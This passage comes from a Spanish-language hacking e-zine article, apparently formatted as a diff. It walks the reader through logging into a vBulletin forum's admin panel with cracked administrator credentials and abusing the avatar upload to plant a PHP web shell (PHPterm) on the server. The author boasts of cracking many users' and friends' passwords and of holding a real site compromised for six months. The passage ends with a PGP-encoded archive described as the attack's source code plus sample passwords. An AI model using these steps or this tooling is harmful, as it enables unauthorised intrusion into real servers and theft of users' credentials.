+fichero adjunto al articulo. Es puramente experimental,  pero  permite  ataques
+hibridos muy fuertes, con varios diccionarios y passwords a la vez, y es un dos
+ordenes de magnitud mas rapido que Python.  Aun  asi,  con  Python  siempre  he
+tenido suficiente para romper la  mayoria  de  las  cosas,  con  la  opcion  de
+hibridacion igual a 1.
+
+
+
+ENTRANDO COMO ADMIN.
+
+Vale, ahora ya tenemos el login y el password de  un  administrador  del  foro.
+Esto esta muy bien si eres un kiddie que quiere hacer el capullo  en  el  foro,
+pero tambien tenemos otras oportunidades de hacer cosas interesantes si sabemos
+como.
+
+Resulta que los foros vBulletin que estamos atacando tienen un fallo  grave  en
+el panel de aministracion: te permiten subir  cualquier  fichero  al  servidor,
+haciendolo pasar por un avatar o un smiley.
+
+Asi que sencillamente, vete al panel de administracion,  que  puedes  encontrar
+en http://www.xxx.com/forum/admincp/index.php
+
+Ahora mete tu login y tu password, y ya estas dentro. Una vez hecho esto,  vete
+al gestor de avatares, y subete al servidor lo que te de  la  gana.  Para  este
+experimento, opte por PHPterm 0.3.0, que es una  terminal  en  PHP  que  puedes
+encontrar facilmente en internet. Lo  unico  que  tienes  que  hacer  ahora  es
+subirte los ficheros de la terminal,  uno  a  uno,  al  servidor,  y  abrir  la
+terminal desde tu navegador. Y ya tienes una shell en el sistema.
+
+Existen alternativas interesantes, dado que no hay  limite  a  la  cantidad  de
+cosas que puedes subirte. Si dominas algo de programacion en PHP, puedes  sacar
+mucha punta a un sitio penetrado.
+
+Y esto es todo.  Si  has  seguido  el  articulo  hasta  aqui  y  has  entendido
+minimamente las cosas, no creo que tengas demasiada difucultad en  hacerte  con
+una shell en algun servidor por la red adelante.
+
+
+UNA ADVERTENCIA SOBRE EL TRAFICO.
+
+La primera vez que lance este  ataque,  tiempo  ha,  me  lo  tome  bastante  de
+cachondeo y me dedique a sacar no solo los passwords  de  los  administradores,
+sino tambien de multitud de usuarios, incluso antes de  subirme  la  shell.  La
+cantidad de trafico que genere al  sitio  fue  lo  bastante  grande  como  para
+disparar, temporalmente, el ranking de alexa para  ese  foro  :-).  Hace  poco,
+mirando las estadisticas del sitio para los ultimos  años,  me  he    econtrado
+conque los dias del ataque destacan en la grafica de hits como  el  Everest  en  
+una llanura. La cosa me llamo bastante la atencion, y me ha hecho pensar de que
+curiosas maneras puede quedar registrada una cafrada que se hace en la red.
+
+Lo cierto es que me dedique, durante una semana, a lanzar ataque tras ataque al
+sitio, y que incluso me puse a romper passwords de amigos en tiempo real,  para
+fardar, y otras bobadas. El trafico generado en un par de ataques para  obtener
+los passwords de los  administradores no deberia destacar demasiado.  De  todos
+modos, me parece importante indicar este detalle, por si te emocionas  y,  como
+yo, te extralimitas a la hora de  lanzar ataques.
+
+A pesar de lo cual, ese sitio que ataque lo tuve penetrado durante  seis  meses
+antes de  aburrirme. Al volver recientemente me he fijado que han parcheado los
+agujeros. Asi que, curiosamente, tampoco parece que llamara mucho la  atencion.
+El motivo del parcheo, me temo, no fue el trafico, sino otras  actividades  que
+realize por alli.
+
+
+
+ARCHIVOS Y CODIGO FUENTE.
+
+Aqui tienes el codigo fuente y unos cuantos passwords para hacer pruebas.  Para
+extraerlo todo, pasalo por PGP o usa la opcion -p desde la  linea  de  comandos. 
+El archivo extraido es iny.tar, de unos 30Kb.
+
+Para sacar esto con PGP 2.6.3i, simplemente:
+
+$ pgp -p articulo.txt
+ 
+
+-----BEGIN PGP MESSAGE-----
+Version: 2.6.3ia
+
+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
+HbDGk77TyHD8SIZ850ck2JXh+KMyrDjzeiaX89XbxdXFm4uFPF9cdSXrfDZL3c8S
+xKMjxknMqU9TuYlA5yrLkihqzw6pn8wDIHIFUbmNle08rVXOQ6tAFUnuEjDy2NQB
+5imIyv651dzjiqjtwt6rzEtup1UjK+pyJAX1X4MkJwjcFVqXOXU7U5qK5VIF2i9V
+wN0c62CC2o09JZ5p46RWfhamRX1d/WYdqdgnf+fk5TrnTdC0/EjR1DALP2g33aRO
+A+dn9nTKzud0LOHibK+U+15JXoALqob/cIOAlVJL6AaOXtNFntO8BLQSspH03Kke
+UlM2vwGj8HDsjceT1oGfLk5uXtM87UXl4t1tcNJrHfq+Btt3N/ohCO+QYvT6bpmm
+Ouv1G1DUSw59fROXW7ppdOPJ2dWFdADBWNT30rlB+tCi/oKpr9q86gl66QGg9f7m
+7FHuyOk+M+AJK1TNW/N90GguL6chzmyrfvH5iiHmVfXrCRgtcs3e1oN/9PfwN6HU
+xYeOCdUePW/FPIrN1DdM8lZ0jh4FwpotPsdyuLA26CTVsVFYsNoo4kB2LspIB6qz
+bqZV0Os33gVvf0d603EtFLq1a8aKuue8ie9p1k2OpAo4tXNyc01dbsDpk4+6wj1t
+UI1nll6HmaB/CTmW2kyTDP1uc3DP/bTgDEd7cF7RJJn9eqAL4mhQAdoDUgHYw4SB
+zK0E4kQa/Qq0zTq6zHf9KMm1MYHntOiLSX+eHboph3VYh3VYh3VYh/U11r8B
+=pmHt
+-----END PGP MESSAGE-----
+
+*EOF*
